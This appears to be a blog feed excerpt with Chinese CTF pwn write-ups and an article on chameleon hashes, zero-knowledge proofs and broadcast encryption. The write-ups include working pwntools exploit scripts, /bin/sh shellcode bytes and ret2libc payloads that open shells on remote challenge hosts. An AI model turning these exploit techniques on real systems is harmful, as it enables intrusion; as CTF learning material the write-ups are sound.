)]]></content>
      <tags>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN 实战 - shellcode 题解]]></title>
    <url>%2F2019%2F10%2F16%2F2019.10.16%EF%BC%8886%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1.shellcode 有关 shellcode 的知识介绍，在这里我就不过多的介绍了，给大家附上几个我认为写的比较好的博文： shellcode原理是啥？ 一步一步学ROP之linux_x86篇 PWN-shellcode获取与编写 渗透中PoC、Exp、Payload与Shellcode的区别 二、解题步骤1,查看文件类型1file pwn3 6 从上面的结果可以得出，该文件是一个 32 位的 ELF 文件 2.查看 pwn3 开启的保护1checksec pwn3 从上图可以得出，pwn3 没有开启栈保护功能，没有开启ASLR，开启了栈上数据可执行，开启了RELRO，意味着我们可以对 GOT 进行写的权限。 3.寻找漏洞 我们用 IDA-32 打开 pwn3 ，通过对程序的观察我们发现在函数 sub_804851A() 中可能产生溢出漏洞： 从上图可以看到： 在栈中给 buf 的实际大小为：ebp - 0x1Ch（十进制：28） 用户实际能输入的数据大小为：0x100h（十进制：256） 所以在这里会产生栈溢出，我们也就可以利用该漏洞获取 flag 4.利用漏洞 在这道题中，因为大多数保护都没有开启，所以我们可以有多种构思思路： 通过 libc 库来泄露 system() 的地址，这和 ROP 那道题的思路差不多 在缓冲区中填写我们构造的 shellcode，再通过返回 shellcode 的地址，来执行 shellcode ，获取系统调用权 这里我们主要以第二种思路来讲解 5.分析思路 首先我们先来看一下这个栈中的情况： 通过上面的情况，我们可以知道： 填充的数据为：0x1c + 0x4 = 32 在返回地址这里，我们有多种返回方式： 我们可以直接返回 buf 的首地址 我们也可以将地址返回到高地址中的参数，然后通过控制esp，再执行 shellcode …… 通过上面的分析，我们可以大概知道自己的 payload 了： payload = shellcode + 'a' * 32 - len(shellcode) + p32(jmp_exp) + jmp_shellcode 具体的执行如下： 6.编写 exp123456789101112131415# -*- coding: utf8 -*-from pwn import *context(os='linux',arch='i386')r = remote('vps1.blue-whale.me',9992)shellcode="\x31\xc0\x31\xd2\x52\x68\x2f\x2f'shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89shellcode += '\xe3\x31\xc9\xb0\x0b\xcd\x80'shellcode_jmp = asm('sub esp,0x24;jmp esp')payload = shellcode + (32-len(shellcode))*'a' + p32(0x08048667) + shellcode_jmpr.send(payload)r.interactive() 7.获取 flag 三、相关问题 返回到 buf 的起始地址后，为什么能够执行 shellcode？ sendline() 和 send() 的区别是什么？]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识]]></title>
    <url>%2F2019%2F10%2F12%2F2019.10.12%EF%BC%8885%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、变色龙哈希（Chameleon Hash）1.哈希函数？ **① 什么是哈希函数？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;哈希函数又叫 Hash、one-way function、单向散列函数等，它是一种可以将任意长度输入的字串可转换成一个固定长度的字串，通过原始字串可以很容易地算出转换后的字串，通过转换后的字串很难还原出原始字串。 ② 哈希函数的特征 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.对于任意m作为输入，得到输出的结果，很难找到另一个输入m’ （m’不等于m），使得m’的Hash结果也为同样的输出，即Hash(m) = Hash(m’)。这一性质成为广义碰撞抵抗性。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. 进一步，很难找到任意两个m和m’，使得Hash(m) = Hash(m’)。这里我们没有固定的m和m’，因此这一要求比第一个要求更为严格。这一性质成为严格碰撞抵抗性。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.抗篡改能力，对于一个数据块，哪怕只改动其一个比特位，其hash值的改动也会非常大。 2.变色龙哈希函数 **① 什么是变色龙哈希函数** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Chameleon Hash 是一类特殊的 Hash 函数，对于绝大多数使用者，其同样满足 Hash 的碰撞抵抗性。然而，如果某个人知道 Chameleon Hash 的一些秘密（我们用sk表示），其可以非常容易破坏Hash的碰撞抵抗性。也就是说，对于任意 m，其很容易能够找到 m’ \\neq m，使得ChameleonHash(m’) = ChameleonHash(m)。这似乎破坏了Hash的碰撞抵抗性，但是在绝大多数使用者来说，其还是安全的Hash。 ② 变色龙哈希函数的特点 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ChameleonHash(m) = ChameleonHash(m‘) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注释：m 和 m’ 分别代表两个不同的明文 ③ 变色龙哈希函数的原理 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设有一个明文为 m，Alice 用变色龙哈希函数计算 m 的哈希值，计算步骤如下： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ Alice 随机选取一个指数 x，这个 x 被称为 私钥 或者 后门 &nbsp;☛ (sk = x) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ Alice 计算所对应的公钥：h = gx &nbsp;☛(pk = （g,h)) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 生成变色龙哈希对应的随机数 r &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 计算明文 m 的相关哈希值：C_H = gm&nbsp; hr = gm gxr = gm+xr &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alice 就把所得到的 Chameleon Hash 值发给了 Bob，在发送的路上这个值被 Attacker 截取了，攻击者想把明文消息进行篡改，但得到相同的 ChameleonHash ，这就是找变色龙哈希函数值的碰撞，实验过程如下： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 攻击者构造想要构造一个明文 m&#39;，使得： gm+xr = gm'+xr'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是 m + xr = m&#39; + xr&#39; ——&gt; m&#39; = m + xr - xr&#39; ，在这里可以随意构造一个明文 m&#39;， 使得 C_H = C_H&#39; ，但就必须要找出一个 r&#39; 满足上述关系式：r’ = $ \frac {m+xr-m’}{x} $，在这里 m&#39;、m、r 已知，但是 x 是 Alice 的密钥，所以攻击者无法成功构造一个 C_H&#39; = C_H &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结：因为对于其他人来说，其不知道 x 的值，因此，如果想构造出一个碰撞，其他人必须在指数上面解方程 gm + xr = gm’ + xr‘，也就是说去求一个离散对数问题。但是，离散对数问题直到现在为止都没有一个很快的算法（最快也是指数级的）。因此对于其他人来说，很难找到碰撞。 **④ 变色龙哈希函数的应用实例** 假设小明和小红达成协议，小明将家族产业10%股份转让给小红。签了合同小名很担心啊，如果小红把这件事告诉别人怎么办？这时候就可以用变色龙函数进行签名。小红生成一个只有她才能找到碰撞的函数交给小明，小明再用这个函数来签电子文档。这下小红把签名后的文件丢给大家也没人相信她了。为什么呢？她掌握着哈希函数的弱点，可以随便生成哈希碰撞啊。她把10%股份改成99%都能保证哈希不会变，进而创造出新文件本来就是小明签的这种假象。因此出自小红之手的文件可信度为零。这个特性叫non-transferability，即两者之间达成的信任不能转到第三方。 “你知道的太多了” 此时此刻成了真正的包袱。 问题来了，小明抵赖怎么破？如果小明死死咬定转让10%股份是小红伪造，事实上只有1%呢？事实上小明也不能信口开河，他得提供对应的证据。证据就是哈希碰撞。假设双方达成的最初合同是A，而小红将其篡改成了相同哈希的A’，那么小明看到A’这份伪证之后一定能拿出最早那个A来并表明A和A’形成哈希碰撞，否则A’就是真货了。因为正常情况下小明无论如何也找不到碰撞，他就不能抵赖。这个特性叫non-repudiation。 ———————————————— ☛ 注：引用知乎用户@滕亦飞的回答 原文链接： https://www.zhihu.com/question/38545889 **⑤ 变色龙哈希函数的攻击案例** 如果某个网站中密码验证的Hash是这么计算的，而这个网站自己本身有Hash所对应的sk，那么，网站自身就可以伪造所有的密码，来窃取用户数据了。所以，有些时候我们需要怀疑一下一些声称安全的网站到底是不是有后门的。即使说是使用Hash验证，或者加上这样那样的功能来进一步提高安全性，但是如果有这样的后门，对于用户来说还是无能为力的。————————————————☞ 注：引用于CSDN用户@ 刘巍然-BUAA 的博文原文链接：https://blog.csdn.net/liuweiran900217/article/details/21819637 3.对哈希函数重要的误区 哈希函数计算出哈希值的过程不是一个加密过程，所以不能说哈希加密/哈希解密之类的话。 二、零知识证明1.什么是零知识证明？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。顾名思义，零知识证明就是既能充分证明自己是某种权益的合法拥有者，又不把有关的信息泄露出去——即给外界的“知识”为“零”。 2.零知识满足的性质 (1)正确性。P无法欺骗V。换言之，若P不知道一个定理的证明方法，则P使V相信他会证明定理的概率很低。 (2)完备性。V无法欺骗P。若P知道一个定理的证明方法，则P使V以绝对优势的概率相信他能证明。 (3)零知识性。V无法获取任何额外的知识。 3.零知识的属性 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识证明需要满足三个属性： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、如果语句为真，诚实的验证者（即：正确遵循协议的验证者）将由诚实的证明者确信这一事实。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、如果语句为假，不排除有概率欺骗者可以说服诚实的验证者它是真的。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、如果语句为真，证明者的目的就是向验证者证明并使验证者相信自己知道或拥有某一消息，而在证明过程中不可向验证者泄漏任何有关被证明消息的内容。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识证明并不是数学意义上的证明，因为它存在小概率的误差，欺骗者有可能通过虚假陈述骗过证明者。换句话来说，零知识证明是概率证明而不是确定性证明。但是也存在有技术能将误差降低到可以忽略的值。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零知识的形式定义必须使用一些计算模型，最常见的是图灵机的计算模型。 4.零知识的例子 1.A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后面的②方法属于零知识证明。它的好处在于，在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。 2.A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天两个人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① B把自己的私钥给A，A用公钥对某个数据加密，然后用B的私钥解密，如果正确，则证明对方确实是B。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。 后面的方法属于零知识证明。 3.有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A要向B证明自己拥有该门的钥匙。采用零知识证明，则B看着A从入口进入走廊，然后又从出口走出走廊，这时B没有得到任何关于这个钥匙的信息，但是完全可以证明A拥有钥匙。 三、广播加密1.什么是广播加密？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 广播加密是一种在不安全信道上给一组用户传输加密信息的密码体制，它可使发送者选取任意用户集合进行广播加密，只有授权用户才能够解密密文。广播加密有着广泛的实际应用背景，例如，数字版权管理、付费电视、卫星广播通信等。一个广播加密方案满足完全抗同谋攻击（fully collusion resistant），即所有撤销用户合作，也无法解密密文。对于一个公钥广播加密方案，用户私钥长度、系统公钥长度、密文长度以及加密解密计算复杂度是衡量性能优劣的重要标准。 四、参考文章 变色龙哈希函数 Chameleon Hash 可变型区块链 Cryptography - Chameleon Hash 变色龙哈希函数是什么？ 零知识证明 不是程序员也能看懂的ZCash零知识证明 零知识证明（Zero-Knowledge Proof）原理详解：非交互式证明实现自动验证防止作假 区块链解读-零知识证明 广播加密 误解广播加密]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn-ROP(GOT表泄露)]]></title>
    <url>%2F2019%2F10%2F08%2F2019.09.28%EF%BC%8884%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1.GOT 表、PLT 表和 libc 库的相关知识① 什么是 GOT 表？ GOT(Global Offset Table) 表，即全局偏移量表，里面是函数在 libc 库中的绝对地址。 ② 什么是 PLT 表？ PLT(Procedure Link Table) 表，即程序链接表，里面是函数在 GOT 表中的地址。 ③ 什么是 libc 库？ libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条） ④ GOT、PLT 和 libc 库的联系 12345678910111213141516171819#include &lt;stdio.h&gt;void print_banner()&#123; printf("Welcome to World of PLT and GOT\n");&#125;void write_file()&#123; fd = open("/tmp/text",File); write(fd,void *buf,3);&#125;int main(void)&#123; print_banner(); write_file(); return 0;&#125; 如上图所示， write_file 函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，假设上述的示例 test 在运行过程中，调用方（如 print_banner 和 write_file )是如何通过 PLT 和 GOT 穿针引线之后，最终调用到 glibc 的 printf 和 write 函数的？ 2.重定位 重定位就是把程序的逻辑地址空间变换成内存中的实际物理地址空间的过程。它是实现多道程序在内存中同时运行的基础。重定位有两种，分别是动态重定位与静态重定位。 ① 静态重定位：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。 ② 动态重定位：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由动态地址变换机构（硬件）自动进行把相对地址转换为绝对地址。动态重定位需要软件和硬件相互配合完成。 （以上来源百度百科词条） 关于重定位的还有以下几篇文章： ① 什么是重定位？为什么需要重定位？ 强烈推荐看一下，因为通过这篇文章又引入了几个概念和问题： 概念 1：链接地址和运行地址 概念 2：位置有关码与位置无关码 问题 1：链接地址跟运行地址不同的情况下会出现什么情况？ 问题 2：为什么会出现链接地址跟运行地址不同的情况？ 问题 3：什么是重定位？ 问题 4：为什么需要重定位？ ② 彻底理解链接器：四，重定位 3.延迟绑定 关于延迟绑定的相关内容与动态链接有者密不可分的联系，我只简单地介绍一下延迟绑定的目的和实现原理。 ① 延迟绑定的目的 &nbsp;&nbsp;&nbsp;&nbsp;第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。 ② 延迟绑定的实现原理 &nbsp;&nbsp;&nbsp;&nbsp;延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下： 123456&gt; bar@plt:&gt; jmp *(bar@GOT)&gt; push n&gt; push moduleID&gt; jump _dl_runtime_resolve&gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。 更多关于延迟绑定和动态链接的文章如下： ① Linux动态链接之二：优化加速之延迟绑定PLT ② 延迟绑定的实现 二、解题思路1.file pwn2 从上面得到的信息是：pwn2 是一个 32 位 可执行的 ELF 文件，并且是动态连接的 2.check pwn2 从上面可以得到的信息是： 开启了 NX，表示我们不能通过栈溢出来执行 shellcode 没有开启栈保护，我们可以利用栈溢出这个漏洞的（Stack: No canary found） 我们对 GOT 表具有写的权限（RELRO: Partial RELRO） 3.IDA 反编译 pwn2 ① 查找漏洞 通过 IDA 对 pwn2 的处理后，我们可以在函数 sub_80484EA() 中看到可能出现的漏洞——read() 函数 12345678&gt; ssize_t sub_80484EA()&gt; &#123;&gt; char buf; // [sp+0h] [bp-58h]@1&gt; &gt; puts("welcome to ROP world");&gt; return read(0, &amp;buf, 0xC8u);&gt; &#125;&gt; &gt; 我们可以通过简单的计算： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88） 所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示： ② 查找 system() 和 /bin/sh 通过在 IDA 里面查找，我们没有找到 system() 和 \\bin\\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 ROPgadget 命令来查找 system() 和 /bin/sh ROPgadget --binary pwn2 --string 'system'但是并没有找到该字符： 4.解题思路 通过我们对文件 pwn2 进行分析后，我们没有发现 system() 和/bin/sh，那么我们该怎么得到这两个的地址呢？ ① 查看 pwn2 用到的库 12&gt; ldd pwn2&gt; &gt; 从上面的得到的信息可以看出，文件 pwn2 中用到的库有 linux-gate.so.1 、libc.so.6、ld-linux.so.2，下面我们来看看这三个库中有什么？ &nbsp;&nbsp;&nbsp;&nbsp;☛ linux-gate.so.1：这个所谓的”linux-gate.so.1”的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。 &nbsp;&nbsp;&nbsp;&nbsp;☛ libc.so.6：我们通过查看libc.so.6库，可以看到这个库包含了 pwn2 程序中出现的puts()函数，以及我们想找的 system()函数以及/bin/sh &nbsp;&nbsp;&nbsp;&nbsp;☛ ld-linux.so.2：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。 下面的是我们计算机中有的库： ② 获得 system 和 /bin/sh 的地址 &nbsp;&nbsp;&nbsp;&nbsp;我们可以利用重定位，来泄露 puts() 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc 的基地址。 &nbsp;&nbsp;&nbsp;&nbsp;我们通过得到的基地址，再通过获取 system() 和 /bin/sh 的偏移地址，我们就可以得到 system() 和 /bin/sh 的实际地址。 &nbsp;&nbsp;&nbsp;&nbsp;libcbase = puts_addr - libc.dump(‘puts’)&nbsp;&nbsp;&nbsp;&nbsp;system_addr = libcbase + libc.dump(‘system’)&nbsp;&nbsp;&nbsp;&nbsp;binsh_addr = libcbase + libc.dump(‘str_bin_sh’) &nbsp;&nbsp;&nbsp;&nbsp;我们可以通过 LicSearcher 根据 puts() 函数的版本，来查找 puts() 、system() 和 /bin/sh的偏移 三、解题步骤1.编写脚本123456789101112131415161718192021222324252627282930313233343536# -*- coding: utf8 -*-from pwn import *from LibcSearcher import *pwn2 = ELF('./pwn2')r = remote('vps1.blue-whale.me',9991)#get the address of "puts"puts_got = pwn2.got['puts']puts_plt = pwn2.plt['puts']main = 0x08048519# First payload (the function is to get address of puts)payload = 'a'*92 + p32(puts_plt) + p32(main) + p32(puts_got)r.recvuntil("welcome to ROP world\n")r.sendline(payload)puts_addr = u32(r.recv()[0:4])print "put_address:" + hex(puts_addr)libc = LibcSearcher('puts',puts_addr)print 'puts_got:' + hex(puts_got)print 'puts_plt:' + hex(puts_plt)#print libc.dump("system")#print libc.dump("str_bin_sh")#print libc.dump("_libc_start_main")#According the address of offset in libc, we can gain the address of system and binshprint "libc.dump(puts):" + hex(libc.dump('puts'))libcbase = puts_addr - libc.dump('puts')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')print "-----------------------------------get_shell----------------------------------"payload = 'a'*92 + p32(system_addr) + 'a'*4 + p32(binsh_addr)r.sendline(payload)r.interactive() 2.执行脚本 3.查看当前目录下的文件夹 4.获取 flag 四、参考文章 延迟绑定的实现 深入了解GOT,PLT和动态链接★ Linux动态链接为什么要用PLT和GOT表？]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn-bof（基础类型题目）]]></title>
    <url>%2F2019%2F09%2F24%2F2019.09.24%EF%BC%8883%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1.内存中栈的结构 正如上图所示，栈是由“由高地址向低地址”方向生长。 2.常见的漏洞类型 常见的漏洞类型有如下几种： **① 逻辑错误** ② 内存破坏 &nbsp;&nbsp;&nbsp;&nbsp;✦ 栈溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 整数溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 格式化字符串 &nbsp;&nbsp;&nbsp;&nbsp;✦ 堆溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 释放后使用 二、解题思路1.寻找漏洞 通过 IDA Pro 对文件进行逆向，通过对伪代码的分析，我们可以看到在函数 sub_8048573 中，有一个明显的漏洞——read（）函数。我们是如何知道该处是一个漏洞呢？ 123456789ssize_t sub_8048573()&#123; char buf; // [sp+Ch] [bp-1Ch]@1 sub_804851B(); sub_804854A(); puts("can you pwn me?"); return read(0, &amp;buf, 0x100u);&#125; 通过上面的伪代码，我们可以得出： &nbsp;&nbsp;&nbsp;&nbsp;① 我们可以往 buf 缓存中读入 0x100u 长的数据； &nbsp;&nbsp;&nbsp;&nbsp;② 但是 buf 缓存离 ebp 的偏移只有 0x1c 长； 因为 0x100u &gt; 0x1c ，意味者我们可以往 buf 中输入 256 大小的的数据，但是会产生一处的现象，出现我们输入的数据覆盖掉 ebp 以上的的数据。 2.构造 payload 现在我来画个示意图，来帮助大家理解： 从上图我们可以知道构造 payload 的思路： &nbsp;&nbsp;&nbsp;&nbsp;① 我们之所以要利用这个漏洞，是想要通过覆盖 return address 的内容，从而跳转到我们想要执行的函数上； &nbsp;&nbsp;&nbsp;&nbsp;② 我们首先要填充 buf 和 ebp 部分，也就是 0x1c + 4 = 32 byte &nbsp;&nbsp;&nbsp;&nbsp;③ 我们想要获取 shell ，所以在 return address 那里，我们要让它返回的地址是 system() 函数的地址； &nbsp;&nbsp;&nbsp;&nbsp;④ 因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据； &nbsp;&nbsp;&nbsp;&nbsp;⑤ 要想获得 shell ，我们就必须执行 system（‘/bin/sh’） 函数，所以下面我们还得填充 system（） 函数得参数地址； 经过上述的分析，我们可以得到下述的示意图：、 三、解题过程1.构造 payload payload = ‘a’ 32 + p32(system_address) + ‘a’ 4 + p32(bin/sh_address) 注：system_address 后面之所以还要加上一个 4 字节的填充，是因为在调用 system 函数后，再返回到我的返回地址(‘a’ * 4：充当的是虚拟的返回地址。我们只要控制在 4 个字节里就 ok！)。再填写我们需要压入栈中的参数 /bin/sh 。 2.查找 system 函数和 /bin/sh 的地址 在 IDA 中，可以查到 system 和 /bin/sh 的地址，如下： a 3.写 exp123456789101112# -*- coding: utf8 -*-from pwn import *r = remote('vps1.blue-whale.me',9990)system_address = 0x080483F0bin_sh_address = 0x0804A02Cpayload = 'a'*32 + p32(system_address) + 'b'*4 + p32(bin_sh_address)r.send(payload)r.interactive() 4.运行脚本，得到 flag]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash 漏洞（pwnable-shellshock）]]></title>
    <url>%2F2019%2F09%2F17%2F2019.09.17%EF%BC%8882%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、前言 pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 bash 的一种题型吧。 二、基础知识1.setresuid setresuid() 被执行的条件有： &nbsp;&nbsp;&nbsp;&nbsp;① 当前进程的 euid 是 root &nbsp;&nbsp;&nbsp;&nbsp;② 三个参数，每个等于原来某个 id 中的一个]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GOT 表攻击实例（pwnbable.kr_passcode）]]></title>
    <url>%2F2019%2F09%2F10%2F2019.09.10%EF%BC%8881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、前言 pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 GOT 表的一种题型吧。 二、基础知识1.GOT 表 ① 什么是 GOT 表？ &nbsp;&nbsp;&nbsp;&nbsp;每一个外部定义的符号在全局偏移表（Global offset Table）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。 &nbsp;&nbsp;&nbsp;&nbsp;GOT 表在 ELF 文件中分为两个部分： ② GOT 表的作用是什么？ &nbsp;&nbsp;&nbsp;&nbsp;把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。 ③ 怎么查看 GOT 表？ &nbsp;&nbsp;&nbsp;&nbsp;在 Linux 系统里，我们可以通过 objdump 命令来查看程序的 GOT 表，具体的指令如下： objdump -R file_name 2.PLT 表 ① 什么是 PLT 表？ &nbsp;&nbsp;&nbsp;&nbsp;过程连接表(Procedure Linkage Table)，一个PLT条目对应一个GOT条目。 &nbsp;&nbsp;&nbsp;&nbsp;当 main() 函数开始，会请求 plt 中这个函数的对应 GOT 地址，如果第一次调用那么 GOT 会重定位到 plt，并向栈中压入一个偏移，程序的执行回到 _init() 函数，rtld得以调用就可以定位 printf 的符号地址，第二次运行程序再次调用这个函数时程序跳入 plt，对应的 GOT 入口点就是真实的函数入口地址。 &nbsp;&nbsp;&nbsp;&nbsp;动态连接器并不会把动态库函数在编译的时候就包含到 ELF 文件中,仅仅是在这个 ELF 被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在 ELF 文件中的 GOT 中保留一个调用地址。 3.动态链接利用原理 ① GOT 表和 PLT 表的关系图 &nbsp;&nbsp;&nbsp;&nbsp;⇲ GOT[0]：.dynamic 的地址。 &nbsp;&nbsp;&nbsp;&nbsp;⇲ GOT[1]：指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息 &nbsp;&nbsp;&nbsp;&nbsp;⇲ GOT[2]：指向动态装载器中 _dl_runtime_resolve 函数 ② 利用流程： call printf@plt jmp *(printf@got) -&gt; (第一次会jmp回来，之后就直接jmp到解析出来的地址了) -&gt; push n -&gt; jmp &amp;plt[0] (跳到公共表项) push got[1] (link_map 可以理解为模块ID) -&gt; jmp *got[2] (跳转到dl_runtime_resolve函数) 以上步骤相当于调用了dl_runtime_resolve(link_map_obj, reloc_arg) 解析完毕后会把解析出来的地址写回reloc_arg定位到的.rel.plt表项中r_offset指向的位置(其实就是.got.plt的对应项) 弄懂dl_runtime_resolve的解析过程后，就可以通过伪造reloc_arg来解析出我们想要的libc函数地址并且写回可控区域了 ③ _dl_runtime_resolve 通过link_map_obj访问.dynamic section，分别取出.dynstr, .dynsym, .rel.plt的地址 .rel.plt + reloc_index 求出当前函数重定位表项 Elf32_Rel的指针，记为rel rel-&gt;r_info的高24位作为.dynsym的下标，求出Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得到符号名字符串 在动态链接库查找这个函数的地址，并且把找到的地址赋值给rel-&gt;r_offset,即.got.plt 最后调用这个函数 4.scanf 的漏洞 &nbsp;&nbsp;&nbsp;&nbsp;如果对 scanf 的利用不加 &amp; ，会很有可能出现漏洞，在这道题目中，我将讲述该函数的漏洞利用。 5.ELF 文件保护机制 **① NX(No-eXecute)** &nbsp;&nbsp;&nbsp;&nbsp;NX 即 No-eXecute 